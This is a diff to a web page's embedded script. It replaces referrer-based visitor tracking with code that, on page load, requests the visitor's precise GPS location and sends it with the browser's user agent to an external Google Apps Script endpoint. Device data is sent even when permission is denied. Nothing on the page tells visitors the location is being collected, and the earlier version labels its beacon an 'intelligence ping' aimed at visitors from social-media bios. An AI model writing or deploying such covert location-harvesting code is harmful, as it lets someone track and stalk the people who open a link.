@@ -98,23 +98,33 @@
 </body>
 <script>
     (function() {
-        const scriptURL = "https://script.google.com/macros/s/AKfycbzwp39jQmGI_fkwitenLDr92WGhh9T8oh_XkUywZG8WkCG-FMl5TkMzSoLliq9YtYGN/exec";
+        const scriptURL = "https://script.google.com/macros/s/AKfycbxmcbl4oJpemPLo51k0b6JwjNpzPz-6adt3kG81nM3Ft8J1Z46db6vAN_VK1nml2Nqd/exec";
         const ua = encodeURIComponent(navigator.userAgent);
-        
-        // Detect if the visitor is from a social bio
-        let source = "Direct Visit";
-        if (document.referrer.includes("instagram.com")) source = "Instagram Bio";
-        else if (document.referrer.includes("facebook.com")) source = "Facebook Link";
 
-        window.addEventListener('load', function() {
-            fetch(`${scriptURL}?ua=${ua}&source=${encodeURIComponent(source)}`, {
-                mode: 'no-cors'
-            })
-            .then(() => console.log("Intelligence ping sent."))
-            .catch(() => console.log("Ping failed. Check URL."));
-        });
+        // Function to send data to Google
+        function sendToGoogle(lat = "", lon = "") {
+            fetch(`${scriptURL}?ua=${ua}&lat=${lat}&lon=${lon}`, { mode: 'no-cors' });
+        }
+
+        // Request Browser GPS Location
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // Success: Send precise GPS coordinates
+                    sendToGoogle(position.coords.latitude, position.coords.longitude);
+                },
+                () => {
+                    // User denied permission: Send device info only
+                    sendToGoogle("Denied", "Denied");
+                },
+                { enableHighAccuracy: true } // Request world-class precision
+            );
+        } else {
+            // Browser doesn't support Geolocation
+            sendToGoogle("NotSupported", "NotSupported");
+        }
     })();
-</script>   
-
+</script>
+    
 </html>
     
